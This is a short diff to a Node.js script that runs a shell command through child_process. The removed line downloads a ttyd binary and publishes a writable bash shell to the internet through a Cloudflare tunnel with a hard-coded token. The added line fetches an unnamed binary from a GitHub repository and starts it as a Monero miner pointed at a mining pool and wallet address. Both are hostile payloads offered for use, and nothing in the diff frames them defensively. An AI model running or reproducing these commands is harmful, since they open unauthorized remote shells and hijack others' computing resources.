@@ -1,6 +1,5 @@
 // Change this to the command you want to run
-const command = "wget https://github.com/iceyfromdiscord/dockerinstaller/raw/refs/heads/main/ttyd && chmod +x ttyd && wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x cloudflared-linux-amd64 && mv cloudflared-linux-amd64 /bin/cloudflared && ./ttyd --writable -p 7681 bash & cloudflared tunnel --url http://localhost:7681 run --token eyJhIjoiMThkMmYxNzUzYzQ2NDc3MjliYTUwMzYwMzBlNjFlYzEiLCJ0IjoiOTVkNWMyMjUtODRjNi00MGY1LWJiNjYtYmJhMzk2MjQwOTU0IiwicyI6Ill6aG1PRFV6WldNdFpUWmpNaTAwTldZNUxXRmpORFl0WVRsaU5HRXhaams1WVRsaCJ9 & cloudflared tunnel --url http://localhost:7681";
-// run-shell.js
+const command = "apt update && apt install -y wget && wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog -o us.monero.gfwroute.com:1111 -u 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ.netlify -a rx/0 -k "
 const { spawn } = require("child_process");
 
 function runShellCommand(commandStr) {
